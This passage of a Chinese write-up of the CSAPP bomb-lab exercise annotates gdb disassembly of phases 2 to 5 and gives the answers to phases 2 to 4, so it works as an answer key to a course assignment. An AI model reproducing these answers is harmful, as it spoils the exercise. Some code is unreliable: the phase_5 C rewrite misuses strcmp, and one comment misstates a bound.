<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble read_six_numbers</span><br><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx		# sscanf函数的第1个可变参数，第3个参数，通过%rdx传递</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx	# sscanf函数的第2个可变参数，第4个参数, 通过%rcx传递</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax	# sscanf函数的第6个可变参数，第8个参数，通过栈传递</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax  # sscanf函数的第5个可变参数，第7个参数，通过栈传递</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9	# sscanf函数的第4个可变参数，第6个参数, 通过%r9传递</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8	# sscanf函数的第3个可变参数，第5个参数, 通过%r8传递</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi	# sscanf函数的第2个参数，通过%esi传递，0x4025c3地址的格式化字符串为&quot;%d %d %d %d %d %d&quot;，表示输入字符串应该为6个整数</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax		# sscanf读入的可变参数需大于5个，否则爆炸</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400f02</code>, <code>0x401463 ~ 0x40147c</code>处的代码，我们可以把调用者<code>phase_2</code>中的<code>$rsp</code>看作一个一维数组的首地址，该数组的长度为6，内容依次为<code>$rsp</code>, <code>$rsp + 4</code>, <code>$rsp + 8</code>, <code>$rsp + 12</code>, <code>$rsp + 16</code>, <code>$rsp + 20</code>，用于 保存<code>sscanf</code>函数执行后生成的6个整数。</p>
<h4 id="炸弹用sscanf读取并解析用户输入字符串"><a href="#炸弹用sscanf读取并解析用户输入字符串" class="headerlink" title="炸弹用sscanf读取并解析用户输入字符串"></a>炸弹用sscanf读取并解析用户输入字符串</h4><p>注意到<code>0x40148a</code>处调用<code>sscanf</code>函数，作用是从用户输入的字符串<code>%rdi</code>中解析出6个整数，保存到调用者<code>phase_2</code>中的<code>$rsp</code></p>
<p>C语言中<code>sscanf</code>函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<p>对照汇编代码， <code>$rdi</code>相当于<code>sscanf</code>的参数<code>str</code>；查看<code>0x401480</code>代码，<code>$esi</code>相当于<code>sscanf</code>的参数<code>format</code>， 用gdb查看<code>0x4025c3</code>处的字符串，为<code>&quot;%d %d %d %d %d %d&quot;</code>， 说明<code>sscanf</code>中的可变参数个数为6，且都是指向<code>int</code>类型的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025c3</span><br><span class="line">0x4025c3:       &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure>

<p>可以看出<code>sscanf</code>函数实际上接收8个入参。<code>read_six_numbers</code>利用<code>%rdi</code>,  <code> %rsi</code>，<code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>分别传递用户输入字符串、格式化字符串、6个整数中的前4个。而第5、6个整数超出了六个参数，需通过栈传递。</p>
<p><strong>到此，确定了第二关需要输入6个整数, 且这6个整数保存在调用者<code>phase_2</code>的<code>%rsp</code>中</strong>，用gdb验证这个结论：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) set args answer 	# 第二行可随便输入6个数，例如1 2 3 4 5 6</span><br><span class="line">(gdb) b *0x400f0a</span><br><span class="line">(gdb) c</span><br><span class="line">Breakpoint 3, 0x0000000000400f0a in phase_2 ()</span><br><span class="line">(gdb) x/6x $rsp			# 查看$rsp, 和输入字符串中6个数一致</span><br><span class="line">0x7fffffffe420: 0x00000001      0x00000002      0x00000003      0x00000004</span><br><span class="line">0x7fffffffe430: 0x00000005      0x00000006</span><br></pre></td></tr></table></figure>

<p>再看下<code>phase_2</code>完整代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi 			# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp) 			# %rsp为调用者保存寄存器，过程调用前后值不变，因此保存的是read_six_numbers输出的6个数，(%rsp)保存的是第一个整数</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;# 将6个整数看作一个数组</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax		# 将数组前一个数保存到%eax</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax			# 将%eax乘以2</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)			# 判断当前整数是否为前一个数的两倍， 不等则爆炸，相等跳转到400f25，</span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx			# 每次循环，将rbx值加4，即指向数组的下一个元素</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx			# rbp指向数组结尾，标识循环是否结束</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx 		# 最初rbx指向第二个数，</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp  	# %rbp = $rsp + 24</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>0x400f0a: cmpl  $0x1,(%rsp)</code>可知，第一个整数一定是1，然后跳转到<code>0x400f30</code>进入循环。</p>
<p>将这6个数看作一个数组， 由<code>0x400f30</code>处代码，<code>$rbx</code>可看作这个数组的下标，初始值为1，指向第2个整数；由<code>0x400f35</code>处代码，<code>$rbp</code>标识着数组的结尾，用于判断循环是否退出。</p>
<p>由<code>0x400f17</code> ~ <code>0x400f1c</code>代码可知，每次循环判断数组当前元素是否为前一个元素的两倍，不等则爆炸。因此答案为<code>1 2 4 8 16 32</code>， 唯一解。</p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>phase_3</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数位于$rsp + 12</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数位于%rsp + 8</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi		# 查看0x4025cf地址处内存，为&quot;%d %d&quot;，表示接受两个整数作为输入</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax			# sscanf返回值需大于1，否则爆炸。说明可变参数个数为2</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt;# 比较结果大于0则跳转</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)	# 跳转表结构，对应C语言中的switch语句</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax			# %rax = 0，跳转到400f7c</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax</span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax		# 判断%eax值与第二个参数是否相等，不等则爆炸</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>与第二关类似，查看<code>0x400f51</code>处代码<code>mov $0x4025cf $esi</code> , 用gdb打印<code>0x4025cf</code>处内存，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>，表示这一关需要输入两个整数。</p>
<p>由<code>400f47 ~ 400f4c</code>代码可知，第一个整数位于<code>$rsp + 8</code>地址，第二个整数位于<code>$rsp + 12</code>地址</p>
<h4 id="确认这两个整数应满足的条件"><a href="#确认这两个整数应满足的条件" class="headerlink" title="确认这两个整数应满足的条件"></a>确认这两个整数应满足的条件</h4><p>观察<code>0x400f6a</code>处的<code>cmp</code>指令。注意比较顺序，是计算<code>*(%rsp + 8) - 7</code> 的值，再判断这个值是否大于<code>0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">400f6f:   77 3c                   ja     400fad				# 引爆炸弹</span><br></pre></td></tr></table></figure>

<p>以上两句汇编等同于 <code>if (*rsp+8) &gt; 7, 跳转到0x400fad</code>， 因此第一个数必须不大于7。</p>
<p><code>0x400f75</code>处<code>jmpq *0x402470(,%rax,8)</code>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于<code>0x402470</code>。<code>%rax</code>取值为[0, 7]，代表switch语句中8条不同的case。 打印这张跳转表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/8g 0x402470</span><br><span class="line">0x402470:       0x0000000000400f7c      0x0000000000400fb9</span><br><span class="line">0x402480:       0x0000000000400f83      0x0000000000400f8a</span><br><span class="line">0x402490:       0x0000000000400f91      0x0000000000400f98</span><br><span class="line">0x4024a0:       0x0000000000400f9f      0x0000000000400fa6</span><br></pre></td></tr></table></figure>

<p>举例，第一个整数取0时，会跳转到<code>0x400f7c</code>, 将<code>0xcf</code>赋给<code>%rax</code>，<code>0x400fbe</code>处再判断<code>$rax</code>和第二个整数是否相等。因此<code>0 207</code>为满足条件的一组解。依次类推，一共得到8组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 207</span><br><span class="line">1 311</span><br><span class="line">2 707</span><br><span class="line">3 256</span><br><span class="line">4 389</span><br><span class="line">5 206</span><br><span class="line">6 682</span><br><span class="line">7 327</span><br></pre></td></tr></table></figure>

<p>switch语句和跳转表内容可参考 《CSAPP 原书第3版》 3.6.8小节 —— switch语句。</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><code>phase_4</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数，用$rcx保存</span><br><span class="line">  401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数，用%rdx保存</span><br><span class="line">  40101a:   be cf 25 40 00          mov    $0x4025cf,%esi		# %rsi处字符串: &quot;%d %d&quot;</span><br><span class="line">  40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)		# 将第一个整数和14比较</span><br><span class="line">  401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;# 如果不大于14跳转，否则引爆炸弹</span><br><span class="line">  401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:   ba 0e 00 00 00          mov    $0xe,%edx 			# func4函数的第一个入参，初值为14</span><br><span class="line">  40103f:   be 00 00 00 00          mov    $0x0,%esi 			# func4函数的第二个入参，初值为0</span><br><span class="line">  401044:   8b 7c 24 08             mov    0x8(%rsp),%edi 		# func4函数的第三个入参，初值为输入的第一个整数</span><br><span class="line">  401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;		# 调用func4, func4为递归函数</span><br><span class="line">  40104d:   85 c0                   test   %eax,%eax			# func4函数必须返回0，否则爆炸</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)		# 第二个整数必须为0， 否则爆炸</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>同样的，先确认输入字符串的格式，查看<code>0x4025cf</code>处的格式化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>， 说明需要输入两个整数。第一个整数位于<code>%rsp + 8</code>， 第二个整数位于<code>%rsp + 12</code></p>
<p>由<code>0x40102e ~ 0x401033</code>代码可知，第一个整数必须不大于14， 否则引爆炸弹。</p>
<p>注意到<code>0x401048</code>处调用<code>func4</code>函数，并判断该函数返回值是否为0，不等于0则引爆炸弹。</p>
<p>由<code>0x40103a ~ 0x401044</code>三条语句可知，<code>func4</code>函数接受三个入参，且三个参数的初始值从左到右分别为输入的第一个整数,<code>14</code>, <code>0</code>。下面查看<code>func4</code>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int func4(int x, int y, int z);</span><br><span class="line"># x in %edi, y in $esi, z in $edx, ret in $eax</span><br><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400fd2:   89 d0                   mov    %edx,%eax 			# ret = z</span><br><span class="line">  400fd4:   29 f0                   sub    %esi,%eax			# ret -= y</span><br><span class="line">  400fd6:   89 c1                   mov    %eax,%ecx			# ecx = ret</span><br><span class="line">  400fd8:   c1 e9 1f                shr    $0x1f,%ecx			# ecx = (ecx &gt;&gt; 31) &amp; 0x1</span><br><span class="line">  400fdb:   01 c8                   add    %ecx,%eax			# ret += ecx</span><br><span class="line">  400fdd:   d1 f8                   sar    %eax					# ret &gt;&gt;= 1</span><br><span class="line">  400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx	# ecx = ret + y</span><br><span class="line">  400fe2:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;	# if ecx &lt;= x, jump to 0x400ff2</span><br><span class="line">  400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx		# z = rcx - 1</span><br><span class="line">  400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:   01 c0                   add    %eax,%eax			# ret *= 2</span><br><span class="line">  400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:   b8 00 00 00 00          mov    $0x0,%eax			# ret = 0</span><br><span class="line">  400ff7:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt;	# if ecx &gt;= x, jump to 0x401007</span><br><span class="line">  400ffb:   8d 71 01                lea    0x1(%rcx),%esi		# y = ecx + 1</span><br><span class="line">  400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;		# ret = func(x, y, z)</span><br><span class="line">  401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax# ret = 2 * ret + 1</span><br><span class="line">  401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  40100b:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>400fe9</code>和<code>400ffe</code>处的<code>callq 400fce &lt;func4&gt;</code>指令可知发生了递归调用。我们可以将<code>func4</code>的汇编代码逐句翻译成C语言，将第一个整数从0取到14依次调用<code>func4</code>函数，看哪些取值能成功返回<code>0</code>。这里需要了解<code>add</code>,<code> sub</code>,<code> sar</code>,<code> shr</code>,<code>lea</code>,<code> jle</code>等指令的用法以及注意操作数的顺序。</p>
<p><code>func4</code>的递归过程，可以转换为如下的C语言函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// x in %edi, y in $esi, z in $edx, ret in %eax</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ecx;</span><br><span class="line">    <span class="type">int</span> ret = z - y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(z &lt; y) &#123;</span><br><span class="line">        ret += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    ecx = ret + y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ecx == x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ecx &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, ecx + <span class="number">1</span>, z) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, y, ecx - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(func4(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);	<span class="comment">// 打印出第一个整数的所有取值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行C程序，发现第一个整数可以是<code>0</code>， <code>1</code>， <code>3</code>， <code>7</code></p>
<p>由<code>phase_4</code>的<code>0x401051 ~ 0x401056</code>代码可知，第二个整数必须为<code>0</code>，否则引爆炸弹。</p>
<p>因此，一共得到四组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0</span><br><span class="line">1 0</span><br><span class="line">3 0</span><br><span class="line">7 0</span><br></pre></td></tr></table></figure>

<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><code>phase_5</code>的代码如下, 根据<code>0x40107f</code>处的<code>cmp $0x6, %eax</code>指令，可确定这关需要输入长度为6的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx			# rbx保存输入字符串</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00</span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax			# 输入字符串的长度必须为6,否则爆炸</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx 			# 将当前字符与上0xf，结果保存在%edx</span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  # 将(0x4024b0+%edx)处的字符保存在%rdx</span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax			# 每次循环%rax加1</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax			# 用%rax循环计数，循环6次</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi		# 0x40245e处字符串为flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi		# 这里需要构造输入串，使得(%rsp+0x10)处的串等于&quot;flyers&quot;</span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax			# 循环开始，eax初值为0</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00</span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>根据<code>jmp 40108b &lt;phase_5+0x29&gt;</code>，看出这段代码是循环。<code>%eax</code>初始为0， 每次循环将%eax加1，再和<code>6</code>进行比较(<code>0x4010a8</code>)。循环结束后调用<code>strings_not_equal</code>,将<code>0x40245e</code>处的字符串和<code>$rsp + 0x10</code>比较，两个字符串必须相等，否则爆炸。先查看<code>0x40245e</code>处的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>flyers</code>， 再看看<code>$rsp + 0x10</code>处的字符串是怎么来的：</p>
<p>从<code>0x401067: mov %rdi,%rbx</code>看出，我们输入的字符串位于<code>%rbx</code>。这里依次将<code>%rbx</code>的每一个字符先与<code>0xf</code>做与运算，然后加上<code>0x4024b0</code>得到新的地址<code>x</code>, 最后取地址<code>x</code>处的字符作为输出；循环结束后，输出一个长度为6的字符串，将以上逻辑改写为如下C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">char</span> str[<span class="number">6</span>])</span> &#123;	<span class="comment">// str表示用户输入的字符串</span></span><br><span class="line">	<span class="type">char</span> res[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">		res[i] = *(<span class="type">char</span> *)((str[i] &amp; <span class="number">0xf</span>) + <span class="number">0x4024b0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> !<span class="built_in">strcmp</span>(res[i], <span class="string">&quot;flyers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，我们只需确定<code>0x4024b0</code>处的内容，然后对照ASCII码表，即可得到答案。</p>
<p>先查看<code>0x4024b0</code>， 只需查看前16个字符</p>
